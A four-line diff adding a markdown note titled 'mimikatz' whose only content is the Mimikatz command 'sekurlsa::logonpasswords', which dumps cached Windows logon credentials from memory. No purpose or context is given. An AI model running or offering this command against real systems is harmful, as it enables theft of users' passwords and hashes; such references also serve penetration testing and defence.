@@ -1,0 +1,4 @@
+# mimikatz
+```
+sekurlsa::logonpasswords
+```
